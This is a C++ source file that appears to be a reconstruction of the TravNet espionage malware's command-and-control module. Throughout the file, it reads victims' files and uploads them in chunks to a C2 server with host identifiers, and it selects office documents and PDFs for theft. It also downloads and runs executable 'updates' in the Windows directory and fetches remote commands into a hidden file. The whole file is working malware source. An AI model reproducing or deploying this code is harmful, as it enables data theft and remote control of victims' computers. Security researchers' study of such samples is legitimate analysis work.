// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "c2.hpp"

#include <iostream>
#include <Wininet.h>
#include <time.h>
#include "StdAfx.hpp"
#include "debug.hpp"
#include "3rd-party\base64.h"

#ifndef NO_HASH_MD5
	#include "md5++.hpp"
#endif

BOOL SendFileToC2(LPCSTR lpszFileToSend, const char *lpszSendName)
{
	// ====================== READ FILE ======================
	HANDLE hFile = CreateFile(lpszFileToSend, GENERIC_READ, 1, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
		return 0;
	
	DWORD dwFileSize = GetFileSize(hFile, 0);
	char *lpFileBuf = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	
	DWORD dwRead = 0;
	if (FALSE == ReadFile(hFile, lpFileBuf, dwFileSize, &dwRead, 0))
	{
		HeapFree(GetProcessHeap(), 0, lpFileBuf);
		CloseHandle(hFile);
		
		return FALSE;
	}
	
	if (dwRead <= 0)
	{
		HeapFree(GetProcessHeap(), 0, lpFileBuf);
		CloseHandle(hFile);
		
		return FALSE;
	}
	
	// ====================== ENCODE FILE DATA ======================
#ifndef NO_CUSTOM_BASE64_ENCODING
	int nEncSize = 0;
	LPVOID lpEncBuf = sub_10007E5C(lpFileBuf, dwFileSize, &nEncSize);
	
	char szEnd[8] = "::end";
	int v7 = (4 * ((nEncSize + 2) / 3)) + 12;
	
	char *szBufEncoded = (char *)HeapAlloc(GetProcessHeap(), 8, v7);
	
	strcpy(szBufEncoded, "begin::");
	int nBufSize = sub_10001072(lpEncBuf, nEncSize, szBufEncoded + 7, v7 - 12);
	memcpy(&szBufEncoded[nBufSize + 7], szEnd, 5);
#else // !NO_CUSTOM_BASE64_ENCODING
	char szEnd[8] = "::end";
	int nBase64Len = Base64encode_len(dwFileSize) + 12;

	char *szBufEncoded = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nBase64Len);

	strcpy(szBufEncoded, "begin::");
	int nBufSize = Base64encode(szBufEncoded + 7, lpFileBuf, dwFileSize) - 1;
	memcpy(&szBufEncoded[nBufSize + 7], szEnd, 5);
#endif // !NO_CUSTOM_BASE64_ENCODING
	
	// ====================== TOKENIZE FILE DATA ======================
	BOOL bRet = FALSE;
	
	DWORD nNextTokenPtr = 0;
	int nTotalSize = nBufSize + 12;
	for (int k = 0; k < nTotalSize; k += 1024)
	{
		int nRetries;
		if ((signed int)(nTotalSize - k) < 1024)
		{
			nRetries = 0;
			while (1)
			{
				bRet = SendFileTokenToC2(&szBufEncoded[k], nTotalSize - k, lpszSendName, k, &nNextTokenPtr);
				if (TRUE == bRet)
					break;
				
				if (++nRetries >= 3)
					goto END;
			}
			g_nSentData += nTotalSize - k;
			
			if (nTotalSize != nNextTokenPtr)
				k = nNextTokenPtr - (nNextTokenPtr % 1024) - 1024;
		}
		else
		{
			nRetries = 0;
			while (1)
			{
				bRet = SendFileTokenToC2(&szBufEncoded[k], 1024, lpszSendName, k, &nNextTokenPtr);
				if (TRUE == bRet)
					break;
				
				if (++nRetries >= 3)
					goto END;
			}
			g_nSentData += 1024;
			
			if (k + 1024 != nNextTokenPtr)
				k = nNextTokenPtr - (nNextTokenPtr % 1024) - 1024;
		}
		
		if (g_nUploadRate > 0)
		{
			DWORD dwTick = GetTickCount();
			DWORD v15 = (dwTick < g_dwLastTickCount) ? (dwTick - g_dwLastTickCount - 1) : (dwTick - g_dwLastTickCount);
			if (v15 > 10000)
			{
				if (g_nSentData > g_nUploadRate * ((v15 / 1000) + 5) << 10)
					Sleep(5000);
				
				g_nSentData = 0;
				g_dwLastTickCount = GetTickCount();
			}
		}
	}

END:
	HeapFree(GetProcessHeap(), 0, szBufEncoded);
#ifndef NO_CUSTOM_BASE64_ENCODING
	HeapFree(GetProcessHeap(), 0, lpEncBuf);
#endif // !NO_CUSTOM_BASE64_ENCODING
	HeapFree(GetProcessHeap(), 0, lpFileBuf);
	
	CloseHandle(hFile);
	
	return bRet;
}

BOOL SendFileTokenToC2(const char *lpszFileText, int nFileTextLen, const char *lpszFileName, DWORD dwFileStart, DWORD *dwRetSize)
{
	INTERNET_PROXY_INFO lpProxy = {};
	
	char szHostName[MAX_PATH];
	char szExtraInfo[MAX_PATH];
	char szScheme[MAX_PATH];
	char szUrlPath[MAX_PATH];
	
	URL_COMPONENTS UrlComponents = {};
	
	UrlComponents.lpszScheme		= szScheme;
	UrlComponents.dwSchemeLength	= MAX_PATH;
	UrlComponents.lpszHostName		= szHostName;
	UrlComponents.dwHostNameLength	= MAX_PATH;
	UrlComponents.lpszUrlPath		= szUrlPath;
	UrlComponents.dwUrlPathLength	= MAX_PATH;
	UrlComponents.lpszExtraInfo		= szExtraInfo;
	UrlComponents.dwExtraInfoLength	= MAX_PATH;

	UrlComponents.dwStructSize		= sizeof(URL_COMPONENTS);
	
	Sleep(1);
	if (NULL == InternetCrackUrl(g_szWebPage, 0, 0, &UrlComponents))
		return FALSE;
	
	Sleep(1);
	char *lpszURL = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nFileTextLen + 1024);
	
	sprintf(lpszURL, "%s?hostid=", UrlComponents.lpszUrlPath);
	strcat(lpszURL, g_szVolumeSerialNr);
	strcat(lpszURL, "&hostname=");
	strcat(lpszURL, g_szHostname);
	strcat(lpszURL, "&hostip=");
	strcat(lpszURL, g_szHostByName);
	strcat(lpszURL, "&filename=");
	strcat(lpszURL, lpszFileName);
	strcat(lpszURL, "&filestart=");
	
#ifndef NO_PATCH
	CHAR szFileStart[16];
#else // NO_PATCH
	CHAR szFileStart[4]; // 4 bytes will result in memory corruption
#endif // NO_PATCH
	sprintf(szFileStart, "%u", dwFileStart);
	strcat(lpszURL, szFileStart);
	strcat(lpszURL, "&filetext=");
	
	memcpy(&lpszURL[strlen(lpszURL)], lpszFileText, nFileTextLen);
	
	CHAR szHeaders[1024];
	sprintf(szHeaders,
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n"
		"Accept-Language: en-us\r\n"
		"Proxy-Connection: Keep-Alive\r\n"
		"Pragma: no-cache"
	);
	
	HINTERNET hInternet = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)", (g_bUseProxy ? 0 : 1), 0, 0, 0);
	if (NULL == hInternet)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpszURL);
		return FALSE;
	}
	
	if (TRUE == g_bUseProxy)
	{
		CHAR szProxy[MAX_PATH];
		CHAR szProxyBypass[MAX_PATH];
		
		sprintf(szProxy, "%s:%s", g_nProxy_IP, g_nProxy_PORT);
		sprintf(szProxyBypass, "%s:%s", g_nProxy_IP, g_nProxy_PORT);
		
		lpProxy.lpszProxy		= szProxy;
		lpProxy.lpszProxyBypass	= szProxyBypass;
		lpProxy.dwAccessType	= INTERNET_OPEN_TYPE_PROXY;
		
		InternetSetOption(hInternet, INTERNET_OPTION_PROXY, &lpProxy, sizeof(INTERNET_PROXY_INFO));
	}
	
	HINTERNET hConnect = InternetConnect(hInternet, UrlComponents.lpszHostName, UrlComponents.nPort, 0, 0, 3, 0, 0);
	if (NULL == hConnect)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpszURL);
		InternetCloseHandle(hInternet);
		
		return FALSE;
	}
	
	if (TRUE == g_bUseProxy)
	{
		InternetSetOption(hConnect, INTERNET_OPTION_PROXY_USERNAME, g_nProxy_USER, strlen(g_nProxy_USER) + 1);
		InternetSetOption(hConnect, INTERNET_OPTION_PROXY_PASSWORD, g_nProxy_PSW, strlen(g_nProxy_PSW) + 1);
	}
	
	HINTERNET hRequest = HttpOpenRequest(hConnect,
		"GET",
		lpszURL,
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION,
		NULL
	);
	if (NULL == hRequest)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpszURL);
		
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return FALSE;
	}
	
	DWORD dwTimeout = 60000;
	
	InternetSetOption(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT,			&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_SEND_TIMEOUT,				&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT,	&dwTimeout, sizeof(DWORD));
	
	BOOL bReqRet = HttpSendRequest(hRequest, szHeaders, strlen(szHeaders), 0, 0);
	
	DWORD dwStatusCode;
	DWORD dwBufferLength = sizeof(DWORD);
	BOOL bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &dwStatusCode, &dwBufferLength, 0);
	if (FALSE == bRet || 200 != dwStatusCode)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpszURL);
		
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return FALSE;
	}
	
	DWORD dwBufSize = 1024;
	CHAR szRetBuf[1024] = {};
	bRet = InternetReadFile(hRequest, szRetBuf, 1024, &dwBufSize);
	if (TRUE == bRet)
	{
		if (_strnicmp(szRetBuf, "Success:", strlen("Success:")))
		{
			bRet = FALSE;
		}
		else
		{
			CHAR szRetSize[16];
			
			sprintf(szRetSize, "%s", &szRetBuf[strlen("Success:")]);
			*dwRetSize = atoi(szRetSize);
		}
	}
	
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpszURL);
	
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	
	return bRet;
}

int GetTaskFromC2()
{
	// ======================== GET TASKS FROM C2 ========================
	CHAR szURL[MAX_PATH];
	sprintf(szURL, "%s", g_szWebPage);
	strcat(szURL, "?action=getdata");
	
	DWORD dwGetSize = 0;
	char *lpGetMem = (char *)GetFromURL(szURL, &dwGetSize);
	if (NULL == lpGetMem)
		return TASK_INVALID; // 0
	
	Sleep(10);
	
	// ======================== SEARCH MY TASK ========================
	CHAR szSearch[MAX_PATH];
	char *lpMem = _strupr(lpGetMem);
	
	// ------------------------ UNINSTALL ------------------------
	sprintf(szSearch, "%s", g_szVolumeSerialNr);
	strcat(szSearch, ":UNINSTALL");
	Sleep(10);
	if (strstr(lpMem, szSearch))
	{
		Sleep(10);
		HeapFree(GetProcessHeap(), 0, lpMem);
		return TASK_UNINSTALL; // 1
	}
	
	// ------------------------ UPDATE ------------------------
	sprintf(szSearch, "%s:UPDATE", g_szVolumeSerialNr);
	Sleep(10);
	if (strstr(lpMem, szSearch))
	{
		Sleep(10);
		HeapFree(GetProcessHeap(), 0, lpMem);
		return TASK_UPDATE; // 2
	}

	// ------------------------ RESET ------------------------
	sprintf(szSearch, "%s:RESET", g_szVolumeSerialNr);
	if (strstr(lpMem, szSearch))
	{
		Sleep(10);
		HeapFree(GetProcessHeap(), 0, lpMem);
		return TASK_RESET; // 3
	}
	
	// ------------------------ UPLOAD ------------------------
	sprintf(szSearch, "%s", g_szVolumeSerialNr);
	strcat(szSearch, ":UPLOAD");
	if (strstr(lpMem, szSearch))
	{
		Sleep(10);
		HeapFree(GetProcessHeap(), 0, lpMem);
		return TASK_UPLOAD; // 4
	}
	
	// ------------------------ TASK UNKNOWN ------------------------
	Sleep(10);
	
	HeapFree(GetProcessHeap(), 0, lpMem);
	PRINTDBG("%s: No valid task found.\n", __FUNCTION__);
	return TASK_INVALID; // 0
}

BOOL TaskUpdate()
{
	CHAR szURL[MAX_PATH];
	sprintf(szURL, "%s?action=datasize", g_szWebPage);
	
	DWORD dwSize = 0;
	char *lpMem = (char *)GetFromURL(szURL, &dwSize);
	if (NULL == lpMem)
		return FALSE;
	
	DWORD dwExeSize = 0;
	if (!_strnicmp(lpMem, "Success:", strlen("Success:")))
	{
		CHAR szExeSize[16]; // unknown size
		
		sprintf(szExeSize, "%s", &lpMem[strlen("Success:")]);
		dwExeSize = atoi(szExeSize);
	}
	
	HeapFree(GetProcessHeap(), 0, lpMem);
	if (0 == dwExeSize)
	{
		PRINTDBG("No update available.\n");
		return FALSE;
	}
	
	PRINTDBG("Update available found (%d bytes)!\n", dwExeSize);
	sprintf(szURL, g_szWebPage);
	char *lpszLastSlash = strrchr(szURL, '/');
	if (NULL == lpszLastSlash)
		return FALSE;
	
	sprintf(lpszLastSlash + 1, "../" TRAVNET_UPDATE_FILE_NAME_REMOTE);
	char *lpExe = (char *)GetFromURL(szURL, &dwSize);
	lpMem = lpExe;
	
	if (NULL == lpExe)
		return FALSE;
	
	DWORD dwPointerPE = 0;
	WORD wHeaderMZ = 0;
	WORD wHeaderPE = 0;
	
	memcpy(&dwPointerPE, lpExe + 60, sizeof(DWORD));
	memcpy(&wHeaderMZ, lpExe, sizeof(WORD));
	memcpy(&wHeaderPE, lpExe + dwPointerPE, sizeof(WORD));

	if (wHeaderMZ != 0x5A4D || wHeaderPE != 0x4550 || dwExeSize != dwSize)
	{
		HeapFree(GetProcessHeap(), 0, lpExe);
		return FALSE;
	}
	
	CHAR szInstallPath[MAX_PATH];
	GetWindowsDirectory(szInstallPath, MAX_PATH);
	lstrcat(szInstallPath, "\\" TRAVNET_UPDATE_FILE_NAME_LOCAL);
	
	PRINTDBG("Installing update to %s\n", szInstallPath);
	HANDLE hFile = CreateFile(szInstallPath, 0x40000000u, 0, 0, 2u, 2u, 0);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		HeapFree(GetProcessHeap(), 0, lpExe);
		PRINTDBG("Installation failed with code %d.\n", GetLastError());
		return FALSE;
	}
	
	DWORD dwWritten;
	WriteFile(hFile, lpExe, dwSize, &dwWritten, NULL);
	CloseHandle(hFile);
	
	PROCESS_INFORMATION procInfo = {};
	STARTUPINFO startInfo = {};
	
	startInfo.dwFlags		= STARTF_USESHOWWINDOW;
	startInfo.wShowWindow	= SW_SHOWNORMAL;
	startInfo.cb			= sizeof(STARTUPINFO);
	
	PRINTDBG("Launching update process.\n");
	CreateProcess(0, szInstallPath, 0, 0, 0, 0, 0, 0, &startInfo, &procInfo);
	
	CloseHandle(procInfo.hProcess);
	CloseHandle(procInfo.hThread);
	
	HeapFree(GetProcessHeap(), 0, lpExe);
	
	sprintf(szURL, "%s", g_szWebPage);
	strcat(szURL, "?action=updated&hostid=");
	strcat(szURL, g_szVolumeSerialNr);
	
	lpMem = (char *)GetFromURL(szURL, &dwSize);
	// CloseHandle(hFile); // file has already been closed
	
	Sleep(10000);
	DeleteFile(szInstallPath);
	
	HeapFree(GetProcessHeap(), 0, lpMem);
	PRINTDBG("Update has been successfully installed.\n");
	return TRUE;
}

LPVOID GetFromURL(LPCSTR szURL, DWORD *lpdwMemLength)
{
	INTERNET_PROXY_INFO lpProxy = {};
	
	char szHostName[MAX_PATH];
	char szExtraInfo[MAX_PATH];
	char szScheme[MAX_PATH];
	char szUrlPath[MAX_PATH];
	
	URL_COMPONENTS UrlComponents = {};
	
	UrlComponents.lpszScheme		= szScheme;
	UrlComponents.dwSchemeLength	= MAX_PATH;
	UrlComponents.lpszHostName		= szHostName;
	UrlComponents.dwHostNameLength	= MAX_PATH;
	UrlComponents.lpszUrlPath		= szUrlPath;
	UrlComponents.dwUrlPathLength	= MAX_PATH;
	UrlComponents.lpszExtraInfo		= szExtraInfo;
	UrlComponents.dwExtraInfoLength	= MAX_PATH;

	UrlComponents.dwStructSize		= sizeof(URL_COMPONENTS);

	if (NULL == InternetCrackUrl(szURL, 0, 0, &UrlComponents))
		return NULL;

	CHAR szHeaders[1024];
	sprintf(szHeaders,
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n"
		"Accept-Language: en-us\r\n"
		"Proxy-Connection: Keep-Alive\r\n"
		"Pragma: no-cache"
	);

	CHAR szAgent[256];
	sprintf(szAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
	
	HINTERNET hInternet;
	if (TRUE == g_bUseProxy)
	{
		Sleep(1);
		hInternet = InternetOpen(szAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	}
	else
	{
		hInternet = InternetOpen(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	}
	
	if (NULL == hInternet)
		return NULL;

	if (TRUE == g_bUseProxy)
	{
		CHAR szProxy[MAX_PATH];
		CHAR szProxyBypass[MAX_PATH];
		
		sprintf(szProxy, "%s:%s", g_nProxy_IP, g_nProxy_PORT);
		sprintf(szProxyBypass, "%s:%s", g_nProxy_IP, g_nProxy_PORT);
		
		lpProxy.lpszProxy		= szProxy;
		lpProxy.lpszProxyBypass	= szProxyBypass;
		lpProxy.dwAccessType	= INTERNET_OPEN_TYPE_PROXY;
		
		InternetSetOption(hInternet, INTERNET_OPTION_PROXY, &lpProxy, sizeof(INTERNET_PROXY_INFO));
	}
	
	HINTERNET hConnect = InternetConnect(hInternet, UrlComponents.lpszHostName, UrlComponents.nPort, 0, 0, 3, 0, 0);
	if (NULL == hConnect)
	{
		InternetCloseHandle(hInternet);
		return NULL;
	}

	if (TRUE == g_bUseProxy)
	{
		InternetSetOption(hConnect, INTERNET_OPTION_PROXY_USERNAME, g_nProxy_USER, strlen(g_nProxy_USER) + 1);
		InternetSetOption(hConnect, INTERNET_OPTION_PROXY_PASSWORD, g_nProxy_PSW, strlen(g_nProxy_PSW) + 1);
	}
	
	CHAR szObjectName[MAX_PATH];
	sprintf(szObjectName, "%s%s", UrlComponents.lpszUrlPath, UrlComponents.lpszExtraInfo);
	
	HINTERNET hRequest = HttpOpenRequest(hConnect,
		"GET",
		szObjectName,
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION,
		NULL
	);
	if (NULL == hRequest)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return NULL;
	}

	DWORD dwTimeout = 60000;
	
	InternetSetOption(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT,			&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_SEND_TIMEOUT,				&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT,	&dwTimeout, sizeof(DWORD));
	
	BOOL bReqRet = HttpSendRequest(hRequest, szHeaders, strlen(szHeaders), 0, 0);
	
	DWORD dwStatusCode;
	DWORD dwBufferLength = sizeof(DWORD);
	BOOL bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &dwStatusCode, &dwBufferLength, 0);
	if (FALSE == bRet || 200 != dwStatusCode)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return NULL;
	}
	
	LPVOID lpMem = NULL;
	DWORD dwReadSize = 0;
	while (1)
	{
		if (NULL != lpMem)
		{
			if (HeapSize(GetProcessHeap(), 0, lpMem) - dwReadSize < 0x2000)
			{
				LPVOID lpNewMem = HeapReAlloc(GetProcessHeap(), 8, lpMem, HeapSize(GetProcessHeap(), 0, lpMem) + 0x2000);
				if (NULL == lpNewMem)
					break;
				
				lpMem = lpNewMem;
			}
		}
		else
		{
			lpMem = HeapAlloc(GetProcessHeap(), 8, 0x2000);
			if (NULL == lpMem)
				goto END;
		}
		
		DWORD dwRead = 0;
		if (FALSE == InternetReadFile(hRequest, ((char *)lpMem) + dwReadSize, 0x2000, &dwRead))
			break;
		
		if (0 == dwRead)
			goto END;
		
		dwReadSize += dwRead;
		*lpdwMemLength = dwReadSize;
	}
	
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpMem);
	lpMem = NULL;
	
END:
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	
	return lpMem;
}

BOOL GetCMDFromC2()
{
	DWORD dwGetSize = 0;
	
	CHAR szGetURL[MAX_PATH];
	sprintf(szGetURL, "%s?action=getcmd&hostid=%s&hostname=%s", g_szWebPage, g_szVolumeSerialNr, g_szHostname);
	
	char *lpMem = (char *)GetFromURL(szGetURL, &dwGetSize);
	if (NULL == lpMem)
		return FALSE;
	
	const char szBegin[13] = "[CmdBegin]\r\n";
	const char szEnd[11] = "[CmdEnd]\r\n";
	
	if (_strnicmp(lpMem, szBegin, strlen(szBegin)) || _strnicmp(lpMem + dwGetSize - strlen(szEnd), szEnd, strlen(szEnd)))
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpMem);
		return FALSE;
	}
	
	HANDLE hFile = CreateFile(g_szStat_T, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpMem);
		return FALSE;
	}
	
	DWORD dwWritten = 0;
	WriteFile(hFile, lpMem, dwGetSize, &dwWritten, 0);
	
	CloseHandle(hFile);
	
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpMem);
	return TRUE;
}

BOOL SendCMDRecvToC2()
{
	CHAR szURL[MAX_PATH];
	
	sprintf(szURL, "%s?action=gotcmd&hostid=", g_szWebPage);
	strcat(szURL, g_szVolumeSerialNr);
	strcat(szURL, "&hostname=");
	strcat(szURL, g_szHostname);
	
	DWORD nGetSize = 0;
	const char *lpGetData = (const char *)GetFromURL(szURL, &nGetSize);
	if (NULL == lpGetData)
		return FALSE;
	
	BOOL bRet = FALSE;
	if (!_strnicmp(lpGetData, "Success", strlen("Success")))
		bRet = TRUE;
	
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpGetData);
	return bRet;
}

BOOL SendEnumFSToC2()
{
	HANDLE hFile = CreateFile(g_szEnumFS, 0x80000000, 1, 0, 3, 0x80, 0);
	if (INVALID_HANDLE_VALUE == hFile)
		return FALSE;
	
	CloseHandle(hFile);
	
	time_t tTime;
	time(&tTime);
	
	struct tm *_tm = localtime(&tTime);
	
	CHAR szFileList[MAX_PATH];
	sprintf(szFileList,
		"FileList-%02u%02u-%02u%02u%02u.ini",
		_tm->tm_mon + 1,
		_tm->tm_mday,
		_tm->tm_hour,
		_tm->tm_min,
		_tm->tm_sec
	);

	return SendFileToC2(g_szEnumFS, szFileList);
}

BOOL SendDNListFilesToC2()
{
#ifndef NO_HASH_MD5
	CMD5 lpMD5;
#endif
	BOOL v0 = FALSE;
	
	HANDLE hDNFile = CreateFile(g_szDNList, 0x80000000u, 1u, 0, 3u, 0x80u, 0);
	if (INVALID_HANDLE_VALUE == hDNFile)
		return FALSE;

	CloseHandle(hDNFile);
	
	CHAR szTypeLimit[64];
	GetPrivateProfileString("Other", "TypeLimit", "True", szTypeLimit, 64u, g_szDNList);
	
	g_bUseTypeLimit = _stricmp(szTypeLimit, "True") == 0;
	if (TRUE == g_bUseTypeLimit)
	{
		GetPrivateProfileString("Other", "Types", "doc,docx,xls,xlsx,txt,rtf,pdf", g_szAcceptedFileTypes, 64, g_szDNList);
		_strlwr(g_szAcceptedFileTypes);
	}
	
	int k = GetPrivateProfileInt("Filelist", "filetotal", 0, g_szDNList);
	for (int i = k; ; k = i)
	{
		if (k <= 0)
		{
			v0 = TRUE;
			break;
		}
		
		CHAR szFileIndex[16];
		sprintf(szFileIndex, "f%d", k);
		
		CHAR szFilePath[MAX_PATH];
		GetPrivateProfileString("Filelist", szFileIndex, g_szBlank, szFilePath, MAX_PATH, g_szDNList);
		if (strlen(szFilePath))
		{
			char szFileExt[MAX_PATH] = {};
			char *v4 = strrchr(szFilePath, '.');
			if (NULL != v4)
			{
				sprintf(szFileExt, "%s", v4 + 1);
				_strlwr(szFileExt);
			}
			
			CHAR szAccepted[MAX_PATH];
			if (TRUE == g_bUseTypeLimit)
			{
				CHAR szExt[MAX_PATH];
				
				sprintf(szAccepted, ",%s,", g_szAcceptedFileTypes);
				sprintf(szExt, ",%s,", szFileExt);
				
				if (!strstr(szAccepted, szExt))
				{
					WritePrivateProfileString("Filelist", szFileIndex, 0, g_szDNList);
					sprintf(szFileIndex, "%d", --i);
					
					WritePrivateProfileString("Filelist", "filetotal", szFileIndex, g_szDNList);
					continue;
				}
			}
			
			HANDLE hFile = CreateFile(szFilePath, 0x80000000u, 1u, 0, 3u, 0x80u, 0);
			if (INVALID_HANDLE_VALUE == hFile)
			{
				if (GetLastError() != 2)
				{
					GetPrivateProfileString("Filelist", "f1", g_szBlank, szAccepted, MAX_PATH, g_szDNList);
					WritePrivateProfileString("Filelist", "f1", szFilePath, g_szDNList);
					WritePrivateProfileString("Filelist", szFileIndex, szAccepted, g_szDNList);
					
					v0 = TRUE;
					break;
				}
			}
			else
			{
				DWORD dwFileSizeHigh = 0;
				DWORD dwFileSize = GetFileSize(hFile, &dwFileSizeHigh);
				
				FILETIME LastWriteTime;
				GetFileTime(hFile, 0, 0, &LastWriteTime);
				
				CloseHandle(hFile);
				
				if (g_dwMaxFileSizeKB && (dwFileSize == -1 || dwFileSize > g_dwMaxFileSizeKB << 10 || dwFileSizeHigh > 0))
				{
					WritePrivateProfileString("Filelist", szFileIndex, 0, g_szDNList);
					sprintf(szFileIndex, "%d", --i);
					
					WritePrivateProfileString("Filelist", "filetotal", szFileIndex, g_szDNList);
					continue;
				}
				
				CHAR szFileTimestamp[292] = {};
				CHAR szFileNetName[MAX_PATH] = {};
				
				SYSTEMTIME SystemTime;
				FileTimeToSystemTime(&LastWriteTime, &SystemTime);
				
				sprintf(szFileTimestamp,
					"%s %d-%02d-%02d %02d:%02d:%02d:%03d",
					szFilePath,
					SystemTime.wYear,
					SystemTime.wMonth,
					SystemTime.wDay,
					SystemTime.wHour,
					SystemTime.wMinute,
					SystemTime.wSecond,
					SystemTime.wMilliseconds
				);
				
#ifndef NO_HASH_MD5
				sprintf(szFileNetName, "%s", lpMD5.GetStringMD5(szFileTimestamp));
#else
				sprintf(szFileNetName, "%s", szFileTimestamp);
#endif
				
				char *lpszFileExt = strrchr(szFilePath, '.');
				sprintf(szFileTimestamp, szFileNetName);
				sprintf(szFileNetName,
					"%d-%02d-%02d-%02d-%02d-%s",
					SystemTime.wYear,
					SystemTime.wMonth,
					SystemTime.wDay,
					SystemTime.wHour,
					SystemTime.wMinute,
					szFileTimestamp
				);
				
				if (NULL != lpszFileExt)
					strcat(szFileNetName, lpszFileExt);
				
				SendFileToC2(szFilePath, szFileNetName);
			}
			
			WritePrivateProfileString("Filelist", szFileIndex, 0, g_szDNList);
		}
		
		sprintf(szFileIndex, "%d", --i);
		WritePrivateProfileString("Filelist", "filetotal", szFileIndex, g_szDNList);
	}
	
	return v0;
}
